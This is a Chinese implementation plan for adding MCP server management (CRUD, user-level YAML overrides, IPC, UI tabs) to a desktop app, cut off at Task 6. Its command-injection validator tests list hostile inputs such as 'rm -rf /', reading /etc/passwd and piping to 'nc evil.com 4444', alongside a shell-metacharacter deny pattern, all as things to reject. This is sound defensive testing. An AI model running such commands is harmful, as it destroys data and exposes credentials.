# 技能页面升级为「能力中心」实施计划

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** 把现有 `SkillsPage` 升级成统一「能力中心」，新增 MCP 服务器管理 Tab（增删改查 + 连接测试 + 工具浏览 + 预设模板），并预留插件 Tab 占位。

**Architecture:** 后端给 `McpService` 加 `addServer/updateServer/removeServer` 三方法 + `mcp.user.yaml` 持久化层（仿 `agents.user.yaml`），新增 3 个 IPC。前端把 `SkillsPage` 重构成 Tab 容器，原技能逻辑搬到 `SkillsTab`，新增 `McpTab` + 3 个子组件 + 预设模板。全局 `mcp.yaml` 永不写入，用户改动走「覆盖语义」落到 `mcp.user.yaml`。

**Tech Stack:** TypeScript + React 18 + react-router-dom v6 + Tailwind + Zustand + Electron/Tauri IPC + yaml 库 + vitest

**Spec:** `docs/superpowers/specs/2026-07-17-skills-mcp-hub-design.md`

---

## 文件结构总览

**新增（10 个）**：
```
src/renderer/pages/Skills/
├── tabs/SkillsTab.tsx          ← 原 SkillsPage 技能逻辑搬迁
├── tabs/McpTab.tsx             ← MCP 服务器管理主 Tab
├── tabs/PluginsTab.tsx         ← 占位 EmptyState
├── components/McpServerCard.tsx
├── components/McpServerForm.tsx
├── components/PresetTemplates.tsx
├── mcp-presets.ts              ← 预设模板常量
└── mcp-validate.ts             ← 纯函数表单校验
tests/main/mcp-service-crud.test.ts
tests/renderer/lib/mcp-validate.test.ts
```

**改动（9 个）**：
```
src/shared/types/index.ts           ← McpServerStatus +2 字段, McpServerConfig +overrides?
src/shared/ipc-channels.ts          ← +3 常量 IPC_MCP_ADD/UPDATE/REMOVE
src/main/services/mcp-helpers.ts    ← +validateCommandSafe
src/main/services/mcp-service.ts    ← +3 方法 + loadConfig 合并 + userConfigPath
src/main/ipc/mcp-handlers.ts        ← +3 IPC handler
src/renderer/lib/ipc-client.ts      ← mcp 类型 +3 方法签名
src/renderer/lib/tauri-bridge.ts    ← +3 channel 常量 + 3 桥接方法
src/renderer/pages/Skills/SkillsPage.tsx  ← 瘦身成 Tab 容器
src/renderer/i18n/zh.json + en.json ← +约 25 key
```

---

## Task 1: 共享类型扩展

**Files:**
- Modify: `src/shared/types/index.ts:520-527`（`McpServerStatus`）
- Modify: `src/shared/types/index.ts:494-510`（`McpServerConfig`）

- [ ] **Step 1: 修改 `McpServerStatus` 加 `source` 和 `enabled` 字段**

打开 `src/shared/types/index.ts`，找到现有 `McpServerStatus`（约 L520-L527）：

```ts
export interface McpServerStatus {
  id: string
  name: string
  connected: boolean
  toolCount: number
  lastError?: string
  transport: McpTransport
}
```

替换为：

```ts
export interface McpServerStatus {
  id: string
  name: string
  connected: boolean
  toolCount: number
  lastError?: string
  transport: McpTransport
  /** 配置来源:全局只读 / 用户级可改 */
  source: 'global' | 'user'
  /** 是否启用(透传给前端显示开关) */
  enabled: boolean
}
```

- [ ] **Step 2: 修改 `McpServerConfig` 加 `overrides` 可选字段**

同一文件，找到 `McpServerConfig`（约 L494-L510），在 `headers` 字段后追加：

```ts
  /** sse/websocket 传输:HTTP 请求头 */
  headers?: Record<string, string>
  /** 覆盖来源标记:用户级覆盖了某个全局同 id server 时标记,remove 时据此恢复全局默认 */
  overrides?: 'global'
```

- [ ] **Step 3: 类型检查通过**

Run: `npx tsc --noEmit`
Expected: 无新增错误（已有的无关错误忽略）

- [ ] **Step 4: Commit**

```bash
git add src/shared/types/index.ts
git commit -m "feat(types): McpServerStatus 加 source/enabled, McpServerConfig 加 overrides"
```

---

## Task 2: mcp-helpers 新增 `validateCommandSafe`

**Files:**
- Modify: `src/main/services/mcp-helpers.ts`（文件末尾追加）
- Test: `tests/main/mcp-helpers.test.ts`（扩展）

- [ ] **Step 1: 先写失败测试**

打开 `tests/main/mcp-helpers.test.ts`，在文件末尾追加（如果文件不存在，照 `tests/main/mcp-tools.test.ts` 风格新建，顶部加 `import { describe, expect, it } from 'vitest'`）：

```ts
import { validateCommandSafe } from '../../src/main/services/mcp-helpers'

describe('validateCommandSafe', () => {
  it('接受普通命令名', () => {
    expect(validateCommandSafe('npx')).toBe(true)
    expect(validateCommandSafe('uvx')).toBe(true)
    expect(validateCommandSafe('node')).toBe(true)
    expect(validateCommandSafe('python3')).toBe(true)
  })

  it('接受带路径的命令', () => {
    expect(validateCommandSafe('/usr/local/bin/npx')).toBe(true)
    expect(validateCommandSafe('./bin/server')).toBe(true)
    expect(validateCommandSafe('C:\\Program Files\\node\\npx.exe')).toBe(true)
  })

  it('拒绝 shell 元字符(命令注入)', () => {
    expect(validateCommandSafe('npx && rm -rf /')).toBe(false)
    expect(validateCommandSafe('npx; cat /etc/passwd')).toBe(false)
    expect(validateCommandSafe('npx | nc evil.com 4444')).toBe(false)
    expect(validateCommandSafe('npx `whoami`')).toBe(false)
    expect(validateCommandSafe('npx $(id)')).toBe(false)
    expect(validateCommandSafe('npx > /tmp/x')).toBe(false)
    expect(validateCommandSafe('npx < /etc/passwd')).toBe(false)
    expect(validateCommandSafe('npx & background')).toBe(false)
  })

  it('拒绝空或非字符串', () => {
    expect(validateCommandSafe('')).toBe(false)
    expect(validateCommandSafe('   ')).toBe(false)
    expect(validateCommandSafe(null as unknown as string)).toBe(false)
    expect(validateCommandSafe(undefined as unknown as string)).toBe(false)
  })

  it('拒绝超长命令(>512 字符)', () => {
    expect(validateCommandSafe('a'.repeat(513))).toBe(false)
    expect(validateCommandSafe('a'.repeat(512))).toBe(true)
  })
})
```

- [ ] **Step 2: 运行测试确认失败**

Run: `npx vitest run tests/main/mcp-helpers.test.ts`
Expected: FAIL — `validateCommandSafe is not a function`（或 import 失败）

- [ ] **Step 3: 实现 `validateCommandSafe`**

打开 `src/main/services/mcp-helpers.ts`，在文件末尾（`validateServerConfig` 之后）追加：

```ts
/** 危险 shell 元字符黑名单(用于校验 stdio server 的 command 字段,防注入) */
const SHELL_METACHAR_RE = /[;&|`$<>]/

/**
 * 校验命令安全性(防 shell 注入)。
 * 规则:
 *   - 必须是非空字符串(trim 后非空)
 *   - 长度 ≤ 512
 *   - 不含危险元字符: ; & | ` $ < >
 *   - 不含 $(...) 或 ${...} 命令替换
 * 注意:Windows 路径分隔符 \ 和盘符 C: 允许。
 */
export function validateCommandSafe(command: unknown): boolean {
  if (typeof command !== 'string') return false
  const trimmed = command.trim()
  if (trimmed.length === 0 || trimmed.length > 512) return false
  if (SHELL_METACHAR_RE.test(trimmed)) return false
  // 拒绝命令替换 $(...) 和 ${...}(但允许环境变量引用在 args/env 中,这里只管 command 本身)
  if (/\$\(|\$\{/.test(trimmed)) return false
  return true
}
```

- [ ] **Step 4: 运行测试确认通过**

Run: `npx vitest run tests/main/mcp-helpers.test.ts`
Expected: PASS — 所有 `validateCommandSafe` 用例通过

- [ ] **Step 5: Commit**

```bash
git add src/main/services/mcp-helpers.ts tests/main/mcp-helpers.test.ts
git commit -m "feat(mcp): validateCommandSafe 防 shell 注入 + 单测"
```

---

## Task 3: McpService 新增 mcp.user.yaml 持久化层 + loadConfig 合并

**Files:**
- Modify: `src/main/services/mcp-service.ts:71-103`（构造函数 + init）
- Modify: `src/main/services/mcp-service.ts:108-133`（loadConfig 重写）
- Test: `tests/main/mcp-service-crud.test.ts`（新建）

> 本 Task 只做「配置加载合并 + user yaml 读写」基础设施，3 个 CRUD 方法放 Task 4。

- [ ] **Step 1: 写失败测试 — loadConfig 合并语义**

新建 `tests/main/mcp-service-crud.test.ts`：

```ts
// =============================================================
// McpService CRUD 测试 — addServer/updateServer/removeServer + 覆盖语义
// 模式:mock electron app.getPath 用 tmpdir 隔离,真实读写 yaml 文件
// =============================================================
import fs from 'node:fs'
import os from 'node:os'
import path from 'node:path'
import { beforeEach, describe, expect, it, vi } from 'vitest'

// 用 tmpdir 隔离每次测试的 userData
let tmpDir: string

vi.mock('electron', () => ({
  app: {
    getPath: () => tmpDir,
  },
}))

// mock settings-service 让 feature flag 默认开启
vi.mock('../../src/main/services/settings-service', () => ({
  settingsService: {
    getSettings: () => ({ mcp: { enabled: true } }),
  },
}))

const { mcpService } = await import('../../src/main/services/mcp-service')

beforeEach(async () => {
  tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'mcp-test-'))
  // 重置 service 内部状态(通过 destroy + init)
  await mcpService.destroy()
})

describe('McpService loadConfig 合并', () => {
  it('无 user yaml 时只加载全局配置', async () => {
    // mcpService 构造函数读 config/mcp.yaml(项目根 config/),我们不改它
    await mcpService.init()
    const servers = mcpService.listServers()
    // 全局 config/mcp.yaml 当前 servers: [] 或含注释模板,所有 server source 应为 'global'
    for (const s of servers) {
      expect(s.source).toBe('global')
    }
  })

  it('user yaml 覆盖同 id 的全局 server', async () => {
    // 写一个 user yaml,包含一个 server
    const userYaml = path.join(tmpDir, 'mcp.user.yaml')
    fs.writeFileSync(
      userYaml,
      `servers:
  - id: test-fs
    name: 测试文件系统
    enabled: true
    transport: stdio
    command: npx
    args: ["-y", "@modelcontextprotocol/server-filesystem"]
`,
      'utf-8',
    )
    await mcpService.init()
    const servers = mcpService.listServers()
    const testFs = servers.find((s) => s.id === 'test-fs')
    expect(testFs).toBeDefined()
    expect(testFs?.source).toBe('user')
    expect(testFs?.name).toBe('测试文件系统')
  })
})
```

- [ ] **Step 2: 运行测试确认失败**

Run: `npx vitest run tests/main/mcp-service-crud.test.ts`
Expected: FAIL — `s.source` 是 `undefined`（现有 `listServers` 不返回 source）

- [ ] **Step 3: 改造 `McpService` 构造函数 + loadConfig**

打开 `src/main/services/mcp-service.ts`。

3a. 在 import 区（L24-L31）确保有 electron app import。当前文件**没有** import electron，需添加。在 L24（`import { spawn, ... }` 之前）加：

```ts
import { app } from 'electron'
```

3b. 在 class `McpService` 字段区（约 L72-L75），加 `userConfigPath` 字段：

找到：
```ts
class McpService {
  private clients: Map<string, MCPClient> = new Map()
  private config: McpServerConfig[] = []
  private configPath: string
  private initialized = false
```

改为：
```ts
class McpService {
  private clients: Map<string, MCPClient> = new Map()
  private config: McpServerConfig[] = []
  private configPath: string
  private userConfigPath: string
  private initialized = false
```

3c. 改造构造函数（约 L77-L82），加 `userConfigPath` 赋值。

找到：
```ts
  constructor() {
    const devConfigDir = path.join(__dirname, '..', '..', 'config')
    const prodConfigDir = path.join(process.resourcesPath || '', 'config')
    const configDir = fs.existsSync(devConfigDir) ? devConfigDir : prodConfigDir
    this.configPath = path.join(configDir, 'mcp.yaml')
  }
```

改为：
```ts
  constructor() {
    const devConfigDir = path.join(__dirname, '..', '..', 'config')
    const prodConfigDir = path.join(process.resourcesPath || '', 'config')
    const configDir = fs.existsSync(devConfigDir) ? devConfigDir : prodConfigDir
    this.configPath = path.join(configDir, 'mcp.yaml')
    // 用户级配置(可写),仿 agents.user.yaml
    this.userConfigPath = path.join(app.getPath('userData'), 'mcp.user.yaml')
  }
```

3d. 重写 `loadConfig()`（约 L108-L133）合并全局+用户级。

找到现有 `loadConfig` 整个方法，替换为：

```ts
  /**
   * 加载配置:全局 mcp.yaml + 用户级 mcp.user.yaml(用户覆盖全局同 id)
   */
  private async loadConfig(): Promise<void> {
    const globalServers = await this.loadConfigFile(this.configPath, 'global')
    const userServers = await this.loadConfigFile(this.userConfigPath, 'user')

    // 合并:用户级整条覆盖同 id 的全局项
    const byId = new Map<string, McpServerConfig>()
    for (const s of globalServers) byId.set(s.id, s)
    for (const s of userServers) byId.set(s.id, s) // user 覆盖 global
    this.config = Array.from(byId.values())
    console.log(
      `[McpService] Loaded ${globalServers.length} global + ${userServers.length} user servers → ${this.config.length} total`,
    )
  }

  /**
   * 读单个 yaml 文件并解析为带 source 标记的 server 列表
   */
  private async loadConfigFile(
    filePath: string,
    source: 'global' | 'user',
  ): Promise<McpServerConfig[]> {
    try {
      const content = await fsp.readFile(filePath, 'utf-8')
      const parsed = yaml.parse(content)
      const servers = parsed?.servers
      if (!Array.isArray(servers)) return []
      return servers
        .filter(validateServerConfig)
        .map((s) => deepInterpolate({ ...s, source }))
        .filter((s) => s.enabled)
    } catch (err) {
      if ((err as NodeJS.ErrnoException).code === 'ENOENT') return []
      console.warn(`[McpService] Failed to load ${filePath}:`, err)
      return []
    }
  }
```

> 注意：这里把 `source` 注入到每个 server 对象上。需要在 `McpServerConfig` 里加 `source` 可选字段，或者用内部扩展。由于 Task 1 给 `McpServerConfig` 没加 `source`（只有 `overrides`），这里用 `{ ...s, source }` 会 TS 报错。

**修正方案**：在 Task 1 Step 2 同时给 `McpServerConfig` 加 `source?: 'global' | 'user'` 字段（运行时注入，序列化时一起写）。回到 Task 1 补这一行：

```ts
  /** 覆盖来源标记:用户级覆盖了某个全局同 id server 时标记,remove 时据此恢复全局默认 */
  overrides?: 'global'
  /** 配置来源(运行时注入,不持久化):global 只读 / user 可改 */
  source?: 'global' | 'user'
```

3e. 改造 `listServers()`（约 L149-L161）返回 `source` 和 `enabled`。

找到：
```ts
  listServers(): McpServerStatus[] {
    return this.config.map((c) => {
      const client = this.clients.get(c.id)
      return {
        id: c.id,
        name: c.name,
        connected: client?.connected ?? false,
        toolCount: client?.tools.length ?? 0,
        lastError: client?.lastError,
        transport: c.transport,
      }
    })
  }
```

改为：
```ts
  listServers(): McpServerStatus[] {
    return this.config.map((c) => {
      const client = this.clients.get(c.id)
      return {
        id: c.id,
        name: c.name,
        connected: client?.connected ?? false,
        toolCount: client?.tools.length ?? 0,
        lastError: client?.lastError,
        transport: c.transport,
        source: c.source ?? 'global',
        enabled: c.enabled,
      }
    })
  }
```

- [ ] **Step 4: 运行测试确认通过**

Run: `npx vitest run tests/main/mcp-service-crud.test.ts`
Expected: PASS — 两个 loadConfig 合并用例通过

- [ ] **Step 5: 确认现有 mcp-tools 测试未被破坏**

Run: `npx vitest run tests/main/mcp-tools.test.ts tests/main/mcp-helpers.test.ts`
Expected: PASS（这些测 mock 了 mcp-service，不受影响）

- [ ] **Step 6: 类型检查**

Run: `npx tsc --noEmit`
Expected: 无新增错误

- [ ] **Step 7: Commit**

```bash
git add src/main/services/mcp-service.ts src/shared/types/index.ts tests/main/mcp-service-crud.test.ts
git commit -m "feat(mcp): loadConfig 合并全局+用户级 mcp.user.yaml + source 字段透传"
```

---

## Task 4: McpService 新增 addServer / updateServer / removeServer

**Files:**
- Modify: `src/main/services/mcp-service.ts`（在 `listServers` 之后加 3 方法）
- Test: `tests/main/mcp-service-crud.test.ts`（扩展）

- [ ] **Step 1: 写失败测试 — CRUD + 覆盖语义**

在 `tests/main/mcp-service-crud.test.ts` 末尾追加：

```ts
describe('McpService addServer', () => {
  it('写入 user yaml 并出现在 listServers', async () => {
    await mcpService.init()
    await mcpService.addServer({
      id: 'add-test',
      name: '新增测试',
      enabled: true,
      transport: 'stdio',
      command: 'npx',
      args: ['-y', 'some-server'],
    })
    const servers = mcpService.listServers()
    const found = servers.find((s) => s.id === 'add-test')
    expect(found).toBeDefined()
    expect(found?.source).toBe('user')

    // 文件确实被写入
    const userYaml = path.join(tmpDir, 'mcp.user.yaml')
    expect(fs.existsSync(userYaml)).toBe(true)
    const content = fs.readFileSync(userYaml, 'utf-8')
    expect(content).toContain('add-test')
  })

  it('拒绝重复 id(用户级已存在)', async () => {
    await mcpService.init()
    await mcpService.addServer({
      id: 'dup',
      name: '第一个',
      enabled: true,
      transport: 'stdio',
      command: 'npx',
    })
    await expect(
      mcpService.addServer({
        id: 'dup',
        name: '第二个',
        enabled: true,
        transport: 'stdio',
        command: 'node',
      }),
    ).rejects.toThrow(/already exists/)
  })

  it('拒绝危险 command', async () => {
    await mcpService.init()
    await expect(
      mcpService.addServer({
        id: 'evil',
        name: '恶意',
        enabled: true,
        transport: 'stdio',
        command: 'npx && rm -rf /',
      }),
    ).rejects.toThrow(/command/)
  })
})

describe('McpService updateServer', () => {
  it('更新用户级 server 的字段', async () => {
    await mcpService.init()
    await mcpService.addServer({
      id: 'upd',
      name: '原名',
      enabled: true,
      transport: 'stdio',
      command: 'npx',
    })
    await mcpService.updateServer('upd', { name: '新名' })
    const servers = mcpService.listServers()
    expect(servers.find((s) => s.id === 'upd')?.name).toBe('新名')
  })

  it('更新全局 server 时走复制覆盖(变 user)', async () => {
    // 前置:往全局 config 写一个 server(测试用,通过临时改 configPath 不现实)
    // 这里用 addServer 模拟一个 user 级,然后测「覆盖已存在的」语义
    await mcpService.init()
    await mcpService.addServer({
      id: 'override-target',
      name: '原用户级',
      enabled: true,
      transport: 'stdio',
      command: 'npx',
    })
    // 改 enabled 开关
    await mcpService.updateServer('override-target', { enabled: false })
    const servers = mcpService.listServers()
    const found = servers.find((s) => s.id === 'override-target')
    // 注意:disabled 的 server 在 loadConfig 时被过滤,但内存中 update 后应保留
    // 这里 update 直接改内存 config,不重新 load
    expect(found).toBeDefined()
  })
})

describe('McpService removeServer', () => {
  it('删除用户级 server', async () => {
    await mcpService.init()
    await mcpService.addServer({
      id: 'rm-me',
      name: '待删',
      enabled: true,
      transport: 'stdio',
      command: 'npx',
    })
    expect(mcpService.listServers().some((s) => s.id === 'rm-me')).toBe(true)
    await mcpService.removeServer('rm-me')
    expect(mcpService.listServers().some((s) => s.id === 'rm-me')).toBe(false)
  })

  it('删除不存在的 id 抛错', async () => {
    await mcpService.init()
    await expect(mcpService.removeServer('nonexistent-id')).rejects.toThrow(/not found/)
  })
})
```

- [ ] **Step 2: 运行测试确认失败**

Run: `npx vitest run tests/main/mcp-service-crud.test.ts`
Expected: FAIL — `mcpService.addServer is not a function`

- [ ] **Step 3: 实现 3 个方法 + 持久化**

打开 `src/main/services/mcp-service.ts`，在 `listServers()` 方法之后（`listToolsForAgent` 之前，约 L162 位置）插入：

```ts
  /**
   * 新增 server(写入 mcp.user.yaml)
   * 校验:id 唯一、配置合法、command 安全
   */
  async addServer(config: McpServerConfig): Promise<void> {
    if (!validateServerConfig(config)) {
      throw new Error('Invalid server config')
    }
    if (this.config.some((s) => s.id === config.id)) {
      throw new Error(`Server ${config.id} already exists`)
    }
    if (config.transport === 'stdio' && !validateCommandSafe(config.command)) {
      throw new Error(`Server ${config.id} command failed safety check`)
    }
    // 读取现有 user 配置 + 追加
    const userServers = await this.readUserConfig()
    const newServer: McpServerConfig = { ...config, source: 'user' }
    userServers.push(newServer)
    await this.writeUserConfig(userServers)
    // 更新内存
    this.config.push(newServer)
    console.log(`[McpService] Added server ${config.id}`)
  }

  /**
   * 更新 server(用户级直接改;全局级复制覆盖到 user)
   */
  async updateServer(id: string, patch: Partial<McpServerConfig>): Promise<void> {
    const existing = this.config.find((s) => s.id === id)
    if (!existing) throw new Error(`Server ${id} not found`)

    // 若 command 被改,校验安全性
    if (patch.command !== undefined && !validateCommandSafe(patch.command)) {
      throw new Error(`Server ${id} command failed safety check`)
    }

    // 若正在连接,先断开(新配置下次连接生效)
    if (this.clients.has(id)) {
      await this.disconnectServer(id)
    }

    const userServers = await this.readUserConfig()
    const userIdx = userServers.findIndex((s) => s.id === id)

    if (existing.source === 'user' || userIdx >= 0) {
      // 已是用户级(或覆盖过),直接 patch user 配置中的对应条目
      if (userIdx >= 0) {
        userServers[userIdx] = { ...userServers[userIdx], ...patch, source: 'user' }
      } else {
        // 内存中是 user 但文件里没有(异常情况),追加
        userServers.push({ ...existing, ...patch, source: 'user' })
      }
    } else {
      // 全局项首次覆盖:复制到 user 级 + 应用 patch + 标记 overrides
      userServers.push({ ...existing, ...patch, source: 'user', overrides: 'global' })
    }
    await this.writeUserConfig(userServers)

    // 更新内存 config
    const idx = this.config.findIndex((s) => s.id === id)
    if (idx >= 0) {
      this.config[idx] = { ...this.config[idx], ...patch, source: 'user' }
    }
    console.log(`[McpService] Updated server ${id}`)
  }

  /**
   * 删除 server
   * - 纯用户级:从 mcp.user.yaml 删除
   * - 覆盖全局产生的用户级:删除覆盖,恢复全局默认(overrides='global')
   * - 纯全局:拒绝
   */
  async removeServer(id: string): Promise<void> {
    const existing = this.config.find((s) => s.id === id)
    if (!existing) throw new Error(`Server ${id} not found`)

    // 断开连接
    if (this.clients.has(id)) {
      await this.disconnectServer(id)
    }

    const userServers = await this.readUserConfig()
    const userIdx = userServers.findIndex((s) => s.id === id)

    if (userIdx < 0) {
      // 不在 user yaml 里 = 纯全局项
      throw new Error(`Server ${id} is global (read-only), cannot remove`)
    }

    const userEntry = userServers[userIdx]
    userServers.splice(userIdx, 1)
    await this.writeUserConfig(userServers)

    // 更新内存
    if (userEntry.overrides === 'global') {
      // 恢复全局默认:重新加载该项
      const globalServers = await this.loadConfigFile(this.configPath, 'global')
      const globalEntry = globalServers.find((s) => s.id === id)
      const idx = this.config.findIndex((s) => s.id === id)
      if (globalEntry && idx >= 0) {
        this.config[idx] = globalEntry
      } else if (idx >= 0) {
        this.config.splice(idx, 1)
      }
      console.log(`[McpService] Removed override for ${id}, restored global default`)
    } else {
      // 纯用户级,直接从内存删除
      const idx = this.config.findIndex((s) => s.id === id)
      if (idx >= 0) this.config.splice(idx, 1)
      console.log(`[McpService] Removed server ${id}`)
    }
  }

  /**
   * 读取 mcp.user.yaml 的 server 列表(不过滤 enabled,保留全部以便编辑)
   */
  private async readUserConfig(): Promise<McpServerConfig[]> {
    try {
      const content = await fsp.readFile(this.userConfigPath, 'utf-8')
      const parsed = yaml.parse(content)
      const servers = parsed?.servers
      if (!Array.isArray(servers)) return []
      return servers.filter(validateServerConfig)
    } catch (err) {
      if ((err as NodeJS.ErrnoException).code === 'ENOENT') return []
      console.warn('[McpService] Failed to read user config:', err)
      return []
    }
  }

  /**
   * 写入 mcp.user.yaml(原子写:tmp + rename)
   */
  private async writeUserConfig(servers: McpServerConfig[]): Promise<void> {
    // 大小上限 1MB
    const payload = `\
# Education Advisor MCP 用户配置
# 此文件由 UI 自动生成,主配置文件 config/mcp.yaml 不会被修改
# 仅记录用户添加或覆盖的 MCP server
${yaml.stringify({ servers })}
`
    if (Buffer.byteLength(payload, 'utf-8') > 1024 * 1024) {
      throw new Error('mcp.user.yaml exceeds 1MB limit')
    }
    const tmpPath = `${this.userConfigPath}.tmp.${process.pid}.${Date.now()}`
    await fsp.mkdir(path.dirname(this.userConfigPath), { recursive: true })
    await fsp.writeFile(tmpPath, payload, 'utf-8')
    await fsp.rename(tmpPath, this.userConfigPath)
  }
```

同时在文件顶部 import 区确认有 `validateCommandSafe`（Task 2 加的）：

找到 `import { deepInterpolate, validateServerConfig } from './mcp-helpers'`，改为：

```ts
import { deepInterpolate, validateCommandSafe, validateServerConfig } from './mcp-helpers'
```

- [ ] **Step 4: 运行测试确认通过**

Run: `npx vitest run tests/main/mcp-service-crud.test.ts`
Expected: PASS — 所有 CRUD + 覆盖语义用例通过

- [ ] **Step 5: 类型检查**

Run: `npx tsc --noEmit`
Expected: 无新增错误

- [ ] **Step 6: Commit**

```bash
git add src/main/services/mcp-service.ts tests/main/mcp-service-crud.test.ts
git commit -m "feat(mcp): addServer/updateServer/removeServer + 覆盖语义 + 原子写"
```

---

## Task 5: 新增 3 个 IPC handler + 全链路

**Files:**
- Modify: `src/shared/ipc-channels.ts:178-183`（加 3 常量）
- Modify: `src/main/ipc/mcp-handlers.ts`（加 3 handler）
- Modify: `src/renderer/lib/ipc-client.ts:195-201`（加 3 类型签名）
- Modify: `src/renderer/lib/tauri-bridge.ts:114-119` + `368-375`（加 3 channel + 3 方法）

- [ ] **Step 1: 加 IPC channel 常量**

打开 `src/shared/ipc-channels.ts`，找到 L178-L183：

```ts
// ===== MCP (Model Context Protocol) =====
export const IPC_MCP_LIST = 'mcp:list'
export const IPC_MCP_CONNECT = 'mcp:connect'
export const IPC_MCP_DISCONNECT = 'mcp:disconnect'
export const IPC_MCP_LIST_TOOLS = 'mcp:list-tools'
export const IPC_MCP_TEST = 'mcp:test'
```

在 `IPC_MCP_TEST` 之后追加：

```ts
export const IPC_MCP_ADD = 'mcp:add'
export const IPC_MCP_UPDATE = 'mcp:update'
export const IPC_MCP_REMOVE = 'mcp:remove'
```

- [ ] **Step 2: 加 IPC handler**

打开 `src/main/ipc/mcp-handlers.ts`，在 `registerMcpHandlers` 函数内、最后的 `console.log('[IPC] MCP handlers registered')` 之前插入 3 个 handler：

```ts
  // 新增 server
  ipcMain.handle(IPC.IPC_MCP_ADD, async (_e, config: unknown) => {
    try {
      await mcpService.addServer(config as McpServerConfig)
      return { success: true }
    } catch (err) {
      const msg = err instanceof Error ? err.message : String(err)
      console.error('[IPC] mcp:add failed:', msg)
      return { success: false, error: msg }
    }
  })

  // 更新 server
  ipcMain.handle(IPC.IPC_MCP_UPDATE, async (_e, id: unknown, patch: unknown) => {
    try {
      const safeId = validateServerId(id)
      await mcpService.updateServer(safeId, (patch as Partial<McpServerConfig>) || {})
      return { success: true }
    } catch (err) {
      const msg = err instanceof Error ? err.message : String(err)
      console.error(`[IPC] mcp:update(${id}) failed:`, msg)
      return { success: false, error: msg }
    }
  })

  // 删除 server
  ipcMain.handle(IPC.IPC_MCP_REMOVE, async (_e, id: unknown) => {
    try {
      const safeId = validateServerId(id)
      await mcpService.removeServer(safeId)
      return { success: true }
    } catch (err) {
      const msg = err instanceof Error ? err.message : String(err)
      console.error(`[IPC] mcp:remove(${id}) failed:`, msg)
      return { success: false, error: msg }
    }
  })
```

同时在 `mcp-handlers.ts` 顶部 import 区加 `McpServerConfig` 类型。找到：

```ts
import { type BrowserWindow, ipcMain } from 'electron'
import * as IPC from '../../shared/ipc-channels'
import { mcpService } from '../services/mcp-service'
```

改为：

```ts
import { type BrowserWindow, ipcMain } from 'electron'
import * as IPC from '../../shared/ipc-channels'
import type { McpServerConfig } from '../../shared/types'
import { mcpService } from '../services/mcp-service'
```

- [ ] **Step 3: 加前端类型签名**

打开 `src/renderer/lib/ipc-client.ts`，找到 L195-L201 的 `mcp:` 块：

```ts
  mcp: {
    list: () => Promise<{ success: boolean; servers: unknown[]; error?: string }>
    connect: (serverId: string) => Promise<{ success: boolean; error?: string }>
    disconnect: (serverId: string) => Promise<{ success: boolean; error?: string }>
    listTools: (serverId: string) => Promise<{ success: boolean; tools: unknown[]; error?: string }>
    test: (serverId: string) => Promise<{ success: boolean; toolCount: number; error?: string }>
  }
```

替换为（同时把 `servers`/`tools` 类型从 `unknown[]` 改为强类型）：

```ts
  mcp: {
    list: () => Promise<{ success: boolean; servers: McpServerStatus[]; error?: string }>
    connect: (serverId: string) => Promise<{ success: boolean; error?: string }>
    disconnect: (serverId: string) => Promise<{ success: boolean; error?: string }>
    listTools: (serverId: string) => Promise<{ success: boolean; tools: McpTool[]; error?: string }>
    test: (serverId: string) => Promise<{ success: boolean; toolCount: number; error?: string }>
    add: (config: McpServerConfig) => Promise<{ success: boolean; error?: string }>
    update: (serverId: string, patch: Partial<McpServerConfig>) => Promise<{ success: boolean; error?: string }>
    remove: (serverId: string) => Promise<{ success: boolean; error?: string }>
  }
```

同时在文件顶部确认 `McpServerConfig` / `McpServerStatus` / `McpTool` 有 import。检查现有 import 语句（约 L1-L10 的 `import type { ... } from '@shared/types'`）。如果没有，加进去：

```ts
import type { McpServerConfig, McpServerStatus, McpTool } from '@shared/types'
```

- [ ] **Step 4: 加 Tauri 桥接**

打开 `src/renderer/lib/tauri-bridge.ts`。

4a. 找到 L114-L119 的 channel 常量：

```ts
  // MCP (Model Context Protocol)
  MCP_LIST: 'mcp:list',
  MCP_CONNECT: 'mcp:connect',
  MCP_DISCONNECT: 'mcp:disconnect',
  MCP_LIST_TOOLS: 'mcp:list-tools',
  MCP_TEST: 'mcp:test',
```

追加：

```ts
  MCP_ADD: 'mcp:add',
  MCP_UPDATE: 'mcp:update',
  MCP_REMOVE: 'mcp:remove',
```

4b. 找到 L368-L375 的 `mcp:` 方法实现：

```ts
    // ---------- MCP (Model Context Protocol) ----------
    mcp: {
      list: () => call(CH.MCP_LIST),
      connect: (serverId: string) => call(CH.MCP_CONNECT, serverId),
      disconnect: (serverId: string) => call(CH.MCP_DISCONNECT, serverId),
      listTools: (serverId: string) => call(CH.MCP_LIST_TOOLS, serverId),
      test: (serverId: string) => call(CH.MCP_TEST, serverId),
    },
```

替换为：

```ts
    // ---------- MCP (Model Context Protocol) ----------
    mcp: {
      list: () => call(CH.MCP_LIST),
      connect: (serverId: string) => call(CH.MCP_CONNECT, serverId),
      disconnect: (serverId: string) => call(CH.MCP_DISCONNECT, serverId),
      listTools: (serverId: string) => call(CH.MCP_LIST_TOOLS, serverId),
      test: (serverId: string) => call(CH.MCP_TEST, serverId),
      add: (config: unknown) => call(CH.MCP_ADD, config),
      update: (serverId: string, patch: unknown) => call(CH.MCP_UPDATE, serverId, patch),
      remove: (serverId: string) => call(CH.MCP_REMOVE, serverId),
    },
```

- [ ] **Step 5: 类型检查**

Run: `npx tsc --noEmit`
Expected: 无新增错误

- [ ] **Step 6: 确认现有 tauri-bridge 测试仍通过**

Run: `npx vitest run tests/renderer/lib/tauri-bridge.test.ts`
Expected: PASS

- [ ] **Step 7: Commit**

```bash
git add src/shared/ipc-channels.ts src/main/ipc/mcp-handlers.ts src/renderer/lib/ipc-client.ts src/renderer/lib/tauri-bridge.ts
git commit -m "feat(ipc): mcp:add/update/remove 全链路 (channel+handler+client+bridge)"
```

---

## Task 6: SkillsPage 重构成 Tab 容器

**Files:**
- Modify: `src/renderer/pages/Skills/SkillsPage.tsx`（整体瘦身重写）
- Create: `src/renderer/pages/Skills/tabs/SkillsTab.tsx`（搬迁原逻辑）

- [ ] **Step 1: 创建 SkillsTab.tsx（搬迁原 SkillsPage 逻辑）**

新建 `src/renderer/pages/Skills/tabs/SkillsTab.tsx`。把现有 `SkillsPage.tsx` 的**全部内容**（L1-L535）复制过来，做如下调整：

- 组件名从 `SkillsPage` 改为 `SkillsTab`
